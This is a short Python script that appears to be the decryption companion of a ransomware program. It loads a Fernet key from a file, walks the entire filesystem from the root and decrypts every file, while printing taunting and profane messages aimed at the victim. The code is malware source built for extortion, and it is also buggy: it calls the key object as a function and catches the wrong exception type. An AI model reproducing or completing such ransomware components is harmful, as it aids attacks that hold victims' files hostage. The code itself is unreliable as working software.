import os, time, pkg_resources, subprocess, sys
from cryptography.fernet import Fernet
from cryptography.exceptions import InvalidKey
from termcolor import colored


# Determine Operation System.
if os.name == 'posix':
    root = "/"
else:
    root = "C:\\"


with open("important.key", "rb") as keyed:
    keye = keyed.read()
    key = Fernet(keye)
    keyed.close()

def decrypt(filename, file):
    with open(filename, "rb") as file1:
        decrypted = key.decrypt(file1.read())
    with open(filename, "wb") as file1:
        file1.write(decrypted)
        file1.close()
    print('The file : ' + colored(file, 'green') + ' Was successfully decrypted')


def get_file():
    for r, d, f in os.walk(root):
        for file in f:
            filePath = os.path.join(r, file)
            decrypt(filePath, file)
    print(colored('DECRYPTION OVER !', 'red'), colored('Better luck next time.', 'green'))


if __name__ == '__main__':
    try:
        Go = input('Hello user, do you want to start decrypting ?\nYes to begin or anything else to abort')
        if Go.lower() == "yes":
            print(colored('Decrypting started !', 'red'))
            key()
            time.sleep(2)
            get_file()
        else:
            print("You still don't have the key ?!\nThings wont get any better for you")
    except InvalidKey:
        print('You got the wrong key Motherfucker')
